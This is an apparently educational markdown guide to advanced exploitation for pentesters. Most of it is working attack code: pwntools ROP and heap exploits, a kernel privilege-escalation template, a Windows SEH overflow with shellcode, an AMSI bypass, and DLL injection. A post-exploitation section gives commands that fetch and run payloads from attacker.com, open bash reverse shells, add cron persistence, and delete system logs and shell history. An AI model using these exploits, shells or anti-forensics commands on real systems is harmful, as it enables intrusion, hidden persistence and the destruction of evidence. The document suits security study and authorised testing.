# üéØ Advanced Exploitation Techniques

**Complexity**: Advanced  
**Audience**: Experienced Pentesters, Red Team Operators  
**Prerequisites**: Strong Linux/Windows knowledge, assembly, reverse engineering

Master advanced exploitation techniques including modern exploit mitigations bypass, zero-day development, and advanced post-exploitation.

---

## üìã Table of Contents

1. [Modern Exploit Mitigations](#modern-exploit-mitigations)
2. [Return-Oriented Programming (ROP)](#return-oriented-programming)
3. [Heap Exploitation](#heap-exploitation)
4. [Kernel Exploitation](#kernel-exploitation)
5. [Windows Exploitation](#windows-exploitation)
6. [Zero-Day Development](#zero-day-development)
7. [Advanced Post-Exploitation](#advanced-post-exploitation)

---

## 1. Modern Exploit Mitigations

### Understanding Protections

Modern systems implement multiple exploit mitigations:

| Protection         | Purpose                         | Bypass Techniques                         |
| ------------------ | ------------------------------- | ----------------------------------------- |
| **ASLR**           | Randomize memory layout         | Information leaks, brute force            |
| **DEP/NX**         | Non-executable stack/heap       | ROP, ret2libc                             |
| **Stack Canaries** | Detect buffer overflows         | Overwrite with correct value, leak canary |
| **PIE**            | Position-independent executable | Information disclosure                    |
| **RELRO**          | Read-only GOT/PLT               | Partial RELRO bypass                      |
| **FORTIFY_SOURCE** | Buffer overflow checks          | Use unchecked functions                   |

### Checking Protections

```bash
# Linux binary protections
checksec --file ./binary

# Output example:
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    PIE enabled

# Manual checks
readelf -l binary | grep GNU_STACK
readelf -d binary | grep BIND_NOW
```

### Bypassing ASLR

**Information Leak Technique**:

```python
#!/usr/bin/env python3
from pwn import *

# Connect to vulnerable service
p = remote('target.com', 9999)

# Trigger format string vulnerability to leak addresses
p.sendline(b"%3$p")  # Leak stack address
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked address: {hex(leak)}")

# Calculate base address (assuming known offset)
base = leak - 0x1234
log.success(f"Binary base: {hex(base)}")

# Now use calculated addresses for ROP chain
```

---

## 2. Return-Oriented Programming (ROP)

### ROP Basics

When NX is enabled, execute existing code snippets (gadgets) to build exploit.

**Finding Gadgets**:

```bash
# Using ROPgadget
ROPgadget --binary ./binary | grep "pop rdi ; ret"

# Using ropper
ropper --file ./binary --search "pop rdi"

# Using pwntools
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
print(rop.dump())
```

### ROP Chain Example (x64)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Build ROP chain for system("/bin/sh")
# 1. Leak libc address
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])  # Return to main

# Send first stage
payload = b"A" * 72  # Offset to return address
payload += rop.chain()

p = process('./vulnerable')
p.sendline(payload)
p.recvline()

# Parse leaked address
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# 2. Call system("/bin/sh")
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload2 = b"A" * 72
payload2 += rop2.chain()

p.sendline(payload2)
p.interactive()
```

### Advanced ROP: SROP (Sigreturn-Oriented Programming)

```python
# Exploiting sigreturn syscall
from pwn import *

context.arch = 'amd64'

# Build sigreturn frame
frame = SigreturnFrame()
frame.rax = 59  # execve syscall
frame.rdi = 0x601000  # Address of "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget  # Address of "syscall; ret"

payload = b"A" * offset
payload += p64(sigreturn_gadget)  # mov rax, 15; syscall; ret
payload += bytes(frame)
```

---

## 3. Heap Exploitation

### Heap Structures

**Glibc malloc chunks**:

```c
struct malloc_chunk {
    size_t prev_size;  // Size of previous chunk (if free)
    size_t size;       // Size of this chunk
    struct malloc_chunk *fd;  // Forward pointer (free chunks)
    struct malloc_chunk *bk;  // Backward pointer (free chunks)
    // User data follows...
};
```

### Use-After-Free (UAF)

```c
// Vulnerable code
char *ptr1 = malloc(100);
free(ptr1);
// ptr1 is not set to NULL!

char *ptr2 = malloc(100);  // Might reuse ptr1's memory
// Now ptr1 and ptr2 point to same memory

strcpy(ptr1, user_input);  // UAF write!
```

**Exploitation**:

```python
#!/usr/bin/env python3
from pwn import *

p = process('./heap_vuln')

# Allocate object with function pointer
p.sendline(b"alloc 0 100")

# Free it
p.sendline(b"free 0")

# Allocate again, overwrite function pointer
payload = p64(0xdeadbeef) * 10
payload += p64(0x401337)  # Address of win() function
p.sendline(b"alloc 1 100")
p.send(payload)

# Trigger use-after-free
p.sendline(b"use 0")
p.interactive()
```

### Heap Overflow Techniques

**Fastbin Attack**:

```python
# Corrupt fastbin fd pointer to arbitrary address
# 1. Allocate and free chunks to populate fastbin
alloc(0, 0x10)
alloc(1, 0x10)
alloc(2, 0x10)

free(1)
free(0)

# 2. Overflow from chunk before fastbin chunk
payload = b"A" * 0x10  # Fill chunk
payload += p64(0x21)   # Size (preserve)
payload += p64(target_address)  # Corrupt fd pointer

edit(2, payload)

# 3. Allocate twice to get chunk at target_address
alloc(3, 0x10)  # Gets original freed chunk
alloc(4, 0x10)  # Gets chunk at target_address!
```

**Tcache Poisoning (glibc >= 2.26)**:

```python
# Easier than fastbin (no size checks)
alloc(0, 0x50)
alloc(1, 0x50)

free(0)
free(1)

# Corrupt tcache fd pointer
payload = p64(target_address)
edit(1, payload)

# Allocate to get target
alloc(2, 0x50)  # Gets freed chunk 1
alloc(3, 0x50)  # Gets target_address!
```

---

## 4. Kernel Exploitation

### Kernel Vulnerability Types

1. **NULL Pointer Dereference**
2. **Use-After-Free**
3. **Race Conditions**
4. **Stack/Heap Overflows**
5. **ret2usr** (return to userspace)

### Kernel Exploit Template

```c
// exploit.c - Privilege escalation via kernel vuln
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>

// Kernel offsets (version-specific)
#define PREPARE_KERNEL_CRED 0xffffffff810a1810
#define COMMIT_CREDS 0xffffffff810a1420

void *(*prepare_kernel_cred)(void *) = (void *)PREPARE_KERNEL_CRED;
int (*commit_creds)(void *) = (void *)COMMIT_CREDS;

void escalate_privs(void) {
    commit_creds(prepare_kernel_cred(0));
}

int main() {
    int fd;
    char buf[256];

    printf("[*] Opening vulnerable device\n");
    fd = open("/dev/vulnerable", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    printf("[*] Triggering vulnerability\n");
    // Build ROP chain or overwrite function pointer
    *(unsigned long *)&buf[0] = (unsigned long)escalate_privs;

    // Trigger vuln
    ioctl(fd, VULN_IOCTL, buf);

    printf("[*] Privilege escalation complete!\n");
    system("/bin/sh");

    return 0;
}
```

### Kernel Debugging

```bash
# Start QEMU with debugging
qemu-system-x86_64 \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 nokaslr" \
    -s -S

# In another terminal, attach GDB
gdb vmlinux
(gdb) target remote :1234
(gdb) break vulnerable_function
(gdb) continue
```

---

## 5. Windows Exploitation

### SEH Overwrite

```python
#!/usr/bin/env python3
from struct import pack

# POP POP RET gadget address (bypasses SafeSEH)
ppr = 0x10023456

# Shellcode (calc.exe)
shellcode = (
    b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x59\x50"
    b"\x51\x64\x8b\x72\x2f\xad\x33\xc9\x66\x81\xe9"
    # ... (truncated for brevity)
)

# Build exploit buffer
nseh = pack('<L', 0x909006eb)  # JMP +6
seh = pack('<L', ppr)

exploit = b"A" * 500
exploit += nseh
exploit += seh
exploit += b"\x90" * 16  # NOP sled
exploit += shellcode

with open('exploit.txt', 'wb') as f:
    f.write(exploit)
```

### Windows Heap Exploitation

**Lookaside List (LAL) Overwrite**:

```c
// Corrupt LFH freelist
HANDLE heap = GetProcessHeap();

// Allocate and free to populate lookaside
void *chunk1 = HeapAlloc(heap, 0, 0x40);
void *chunk2 = HeapAlloc(heap, 0, 0x40);

HeapFree(heap, 0, chunk1);

// Overflow to corrupt freelist pointer
char overflow[0x50];
memset(overflow, 'A', 0x40);
*(void **)&overflow[0x40] = target_address;

HeapFree(heap, 0, chunk2);
// Next allocation returns target_address
```

---

## 6. Zero-Day Development

### Vulnerability Research Process

1. **Target Selection**

    - Popular software
    - High attack surface
    - Poor security history

2. **Attack Surface Analysis**

    ```bash
    # Find entry points
    strings binary | grep -E "(file|network|input)"

    # Identify parsers
    objdump -d binary | grep -E "(xml|json|parse)"
    ```

3. **Fuzzing**

    ```bash
    # AFL fuzzing
    afl-fuzz -i input/ -o output/ -m none -- ./target @@

    # LibFuzzer
    clang -fsanitize=fuzzer,address target.c -o fuzzer
    ./fuzzer corpus/
    ```

4. **Root Cause Analysis**

    ```bash
    # Reproduce crash
    gdb ./target
    (gdb) run < crash_input

    # Analyze crash
    (gdb) bt
    (gdb) x/20i $rip
    (gdb) info registers
    ```

5. **Exploit Development**
    - Verify exploitability
    - Bypass mitigations
    - Write reliable exploit
    - Test on multiple versions

### Responsible Disclosure

```markdown
# Vulnerability Report Template

**Vendor**: Software Company Inc.
**Product**: Product Name v1.2.3
**Vulnerability Type**: Heap Buffer Overflow
**Severity**: Critical (CVSS 9.8)

## Summary

A heap buffer overflow exists in the XYZ parser...

## Affected Versions

-   Version 1.2.0 - 1.2.3
-   Platform: Linux x64

## Proof of Concept

[Attach PoC code]

## Impact

Remote code execution with user privileges...

## Remediation

Input validation on line 234...

## Timeline

-   2025-01-15: Initial discovery
-   2025-01-16: Vendor notification
-   2025-01-17: Vendor acknowledgment
-   2025-02-15: Patch released (30 days)
-   2025-03-15: Public disclosure (90 days)
```

---

## 7. Advanced Post-Exploitation

### Living off the Land (LOL)

**Windows**:

```powershell
# Download file without powershell.exe
certutil -urlcache -f http://attacker.com/payload.exe payload.exe

# Execute payload
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""payload.exe"":close")

# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Linux**:

```bash
# Download and execute in memory
curl http://attacker.com/script.sh | bash

# Reverse shell without nc
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1

# Persistence via cron (no file)
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'") | crontab -
```

### Process Injection (Windows)

```c
// DLL injection via CreateRemoteThread
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char *dll_path) {
    HANDLE hProcess, hThread;
    LPVOID pRemoteBuf;
    DWORD dwSize = strlen(dll_path) + 1;

    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    // Allocate memory in target
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize,
                                 MEM_COMMIT, PAGE_READWRITE);

    // Write DLL path
    WriteProcessMemory(hProcess, pRemoteBuf, dll_path, dwSize, NULL);

    // Create remote thread to call LoadLibrary
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                  pRemoteBuf, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

### Reflective DLL Injection

```c
// Load DLL from memory without touching disk
HMODULE ReflectiveLoader(LPVOID lpParameter) {
    HMODULE hModule;
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeaders;

    // Parse PE headers
    pDosHeader = (PIMAGE_DOS_HEADER)lpParameter;
    pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)lpParameter + pDosHeader->e_lfanew);

    // Allocate memory for DLL
    hModule = VirtualAlloc(NULL, pNtHeaders->OptionalHeader.SizeOfImage,
                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy headers and sections
    memcpy(hModule, lpParameter, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Process relocations, imports, etc.
    // ... (implementation details)

    return hModule;
}
```

### Anti-Forensics

```bash
# Clear logs
sudo rm -f /var/log/auth.log*
sudo rm -f /var/log/syslog*
sudo rm -f ~/.bash_history

# Timestamp manipulation
touch -r /etc/passwd malware.sh

# Secure delete
shred -vfz -n 10 sensitive_file

# Disable history
unset HISTFILE
export HISTSIZE=0

# Memory-only operations
exec 3<>/dev/tcp/10.10.10.5/4444
cat >&3
```

---

## üß™ Practice Labs

### Lab 1: ROP Chain Construction

**Objective**: Bypass NX with ROP  
**Target**: Buffer overflow with NX enabled  
**Goal**: Execute shell with ROP

### Lab 2: Heap Exploitation

**Objective**: Exploit UAF vulnerability  
**Target**: Heap-based application  
**Goal**: Hijack execution flow

### Lab 3: Kernel Exploitation

**Objective**: Escalate privileges via kernel vuln  
**Target**: Vulnerable kernel module  
**Goal**: Get root shell

---

## üìö Resources

**Books**:

-   "The Art of Exploitation" by Jon Erickson
-   "A Guide to Kernel Exploitation" by Enrico Perla
-   "Windows Internals" by Mark Russinovich

**Tools**:

-   **Pwntools**: Python exploit framework
-   **ROPgadget**: ROP chain builder
-   **GDB-PEDA**: Enhanced GDB
-   **Radare2**: Reverse engineering
-   **AFL/LibFuzzer**: Fuzzing

**Practice**:

-   **Exploit Education**: https://exploit.education/
-   **HackTheBox**: Advanced machines
-   **CTF Time**: Exploit challenges

---

**Last Updated**: October 4, 2025  
**Difficulty**: Expert Level  
**Estimated Time**: 100+ hours to master  
**Prerequisites**: Strong systems programming, assembly, reverse engineering

---

**‚ö†Ô∏è Legal Notice**: These techniques are for educational purposes and authorized security testing only. Unauthorized exploitation is illegal.
